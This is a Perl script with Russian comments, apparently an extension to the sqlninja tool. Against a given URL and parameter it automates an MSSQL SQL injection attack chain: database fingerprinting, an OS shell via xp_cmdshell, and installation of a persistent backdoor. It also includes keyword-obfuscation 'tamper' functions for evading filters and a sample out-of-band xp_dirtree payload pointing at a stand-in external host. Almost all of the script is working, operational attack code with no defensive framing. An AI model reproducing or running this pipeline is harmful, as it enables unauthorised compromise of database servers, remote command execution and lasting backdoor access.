#!/usr/bin/perl
# sqli_ninja_ext.pl — Perl-расширение sqlninja: единый пайплайн
# fingerprint -> xp_cmdshell -> backdoor + OOB-тамперы для MSSQL.
#
# Использование (вызывается из sqli_orchestrator.py автоматически):
# perl sqli_ninja_ext.pl <target_url> <param> <post_data>
#
# Требует: perl, модуль sqlninja в PATH или рядом (./sqlninja).
# Если sqlninja не найден — работает в автономном режиме: генерирует
# конфиг и печатает команды для ручного запуска.

use strict;
use warnings;

my ($target, $param, $post_data) = @ARGV;
unless (defined $target && defined $param) {
 print "Usage: perl sqli_ninja_ext.pl <target_url> <param> [post_data]\n";
 exit 1;
}
$post_data //= '';

# --- поиск sqlninja ---
my $sqlninja_bin = `which sqlninja 2>/dev/null`;
chomp $sqlninja_bin;
if (!$sqlninja_bin || !-x $sqlninja_bin) {
 if (-x "./sqlninja") {
 $sqlninja_bin = "./sqlninja";
 } else {
 print "[SQLNINJA-EXT] sqlninja не найден в PATH — автономный режим.\n";
 $sqlninja_bin = "";
 }
}

# --- OOB-тамперы: обфускация пейлоадов для xp_cmdshell ---
sub tamper_dollar_replace {
 my ($p) = @_;
 # CHAR()-обфускация кавычек: 'x' -> CHAR(120)
 my %map = ("'" => "CHAR(39)", " " => "CHAR(32)", ";" => "CHAR(59)");
 $p =~ s/([' ;])/exists $map{$1} ? $map{$1}: $1/ge;
 return $p;
}

sub tamper_comment_split {
 my ($p) = @_;
 # вставка комментариев внутрь ключевых слов: EXEC -> EX/**/EC
 $p =~ s/\b(EXEC|MASTER|WAITFOR|DECLARE)\b/join("/**/", split(//, $1))/ge;
 return $p;
}

# --- генерация конфига sqlninja ---
my $config = <<"EOF";
# sqlninja config, сгенерирован sqli_ninja_ext.pl
--target = $target
--injectedparam = $param
--mode = $post_data ? 'post': 'get'
--poststring = $post_data
--technique = 0
EOF

my $config_file = "sqlninja_ext_$param.conf";
open(my $fh, '>', $config_file) or die "Не могу записать $config_file: $!";
print $fh $config;
close $fh;
print "[SQLNINJA-EXT] Конфиг: $config_file\n";

# --- пайплайн: fingerprint -> xp_cmdshell -> backdoor ---
my @stages = (
 ["fingerprint", "снятие отпечатка СУБД"],
 ["xp_cmdshell", "получение OS-shell через xp_cmdshell"],
 ["backdoor", "установка persistent backdoor"],
);

print "[SQLNINJA-EXT] Пайплайн: fingerprint -> xp_cmdshell -> backdoor\n";

if ($sqlninja_bin) {
 foreach my $stage (@stages) {
 my ($mode, $desc) = @$stage;
 print "[SQLNINJA-EXT] Стадия: $desc ($mode)...\n";
 my $cmd = "$sqlninja_bin -m $mode -f $config_file 2>&1";
 my $output = `$cmd`;
 print $output;
 if ($? != 0) {
 print "[SQLNINJA-EXT] Стадия $mode завершилась с ошибкой — "
. "переходим к следующей.\n";
 }
 }
} else {
 # автономный режим: печатаем команды для ручного запуска
 foreach my $stage (@stages) {
 my ($mode, $desc) = @$stage;
 print "[SQLNINJA-EXT] (ручной запуск) $desc:\n"
. " $sqlninja_bin -m $mode -f $config_file\n";
 }
 # пример OOB-тамперов для ручного применения
 my $sample = "'; EXEC master..xp_dirtree '\\\\\\\\token.oob.example.com\\\\x'--";
 print "[SQLNINJA-EXT] OOB-тампер (CHAR-обфускация): "
. tamper_dollar_replace($sample). "\n";
 print "[SQLNINJA-EXT] OOB-тампер (comment-split): "
. tamper_comment_split($sample). "\n";
}

print "[SQLNINJA-EXT] Готово.\n";
exit 0;